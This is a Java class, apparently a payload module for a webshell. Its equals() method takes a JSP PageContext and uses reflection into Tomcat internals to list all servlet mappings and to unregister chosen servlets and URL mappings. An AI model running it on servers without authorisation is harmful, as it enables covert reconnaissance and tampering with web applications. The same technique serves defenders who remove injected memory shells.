import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import javax.servlet.Servlet;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;

public class ServletManage {
    public String action;
    public String wrapperName;
    public String urlPattern;
    private PageContext pageContext;

    public ServletManage() {
    }

    public boolean equals(Object paramObject) {
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        this.pageContext = (PageContext) paramObject;
        action = "ServletAction";
        wrapperName = "ServiceName";
        urlPattern = "UrlPath";
        HttpServletResponse response = (HttpServletResponse) pageContext.getResponse();
        try {
            output.append("->" + "|");
            if (action.equals("getAllServlet")) {
                sb.append(getAllServlet());
            } else {
                if (action.equals("unLoadServlet")) {
                    sb.append(unLoadServlet());
                } else {
                    sb.append(String.format("%s method not exist", action));
                }
            }
            output.append(sb.toString());
            output.append("|" + "<-");
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        try {
            output.append(sb);
            response.getWriter().print(output.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
        return true;
    }


    public String getAllServlet() {
        try {
            Object o = getFieldValue(this.pageContext.getServletContext(), "context");
            Object standardContext = getFieldValue(o, "context");
            HashMap servletMappings = (HashMap) getFieldValue(standardContext, "servletMappings");
            Iterator s = servletMappings.keySet().iterator();

            StringBuilder sb;
            for (sb = new StringBuilder(); s.hasNext(); sb.append("\n")) {
                try {
                    String url = (String) s.next();
                    String wrapperName = (String) servletMappings.get(url);
                    Object wrapper = this.invoke(standardContext, "findChild", wrapperName);
                    sb.append(String.format("%s -> %s -> %s", url, wrapperName, this.invoke(wrapper, "getServletClass", (Object[]) null)));
                } catch (Exception var9) {
                    sb.append(var9.getMessage());
                }
            }

            return sb.toString();
        } catch (Exception var10) {
            return var10.getMessage();
        }
    }

    public String unLoadServlet() {
        if (wrapperName != null && wrapperName.length() > 0 && urlPattern != null && urlPattern.length() > 0) {
            try {
                Object o = getFieldValue(this.pageContext.getServletContext(), "context");
                Field field = o.getClass().getDeclaredField("context");
                field.setAccessible(true);
                Object standardContext = getFieldValue(o, "context");
                Object wrapper = this.invoke(standardContext, "findChild", wrapperName);
                Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
                if (wrapper != null) {
                    standardContext.getClass().getDeclaredMethod("removeChild", containerClass).invoke(standardContext, wrapper);
                    this.invoke(standardContext, "removeServletMapping", urlPattern);
                    if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
                        this.transform(standardContext, urlPattern);
                    }

                    return "ok";
                } else {
                    return "not find wrapper";
                }
            } catch (Exception var8) {
                return var8.getMessage();
            }
        } else {
            return "wrapperName or urlPattern is Null";
        }
    }

    private void transform(Object standardContext, String path) throws Exception {
        Object containerBase = this.invoke(standardContext, "getParent", (Object[]) null);
        Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
        Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
        listenersField.setAccessible(true);
        ArrayList listeners = (ArrayList) listenersField.get(containerBase);

        for (int i = 0; i < listeners.size(); ++i) {
            Object mapperListener_Mapper = listeners.get(i);
            if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
                Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
                Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

                for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
                    Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
                    Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
                    Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

                    for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                        Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                        if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                            new ArrayList();
                            Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[]) null);
                            Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                            Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                            Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                            int l;
                            Object Mapper_Wrapper;
                            Method addWrapperMethod;
                            for (l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                                }
                            }

                            for (l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                                Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                                if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                                    addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                                    addWrapperMethod.setAccessible(true);
                                    addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                                }
                            }
                        }
                    }
                }
            }
        }

    }


    private Object invoke(Object obj, String methodName, Object... parameters) {
        try {
            ArrayList classes = new ArrayList();
            if (parameters != null) {
                for (int i = 0; i < parameters.length; ++i) {
                    Object o1 = parameters[i];
                    if (o1 != null) {
                        classes.add(o1.getClass());
                    } else {
                        classes.add((Object) null);
                    }
                }
            }

            Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[]) classes.toArray(new Class[0]));
            return method.invoke(obj, parameters);
        } catch (Exception var7) {
            return null;
        }
    }

    private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();

            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception var6) {
                    cs = cs.getSuperclass();
                }
            }
        }

        f.setAccessible(true);
        return f.get(obj);
    }

}
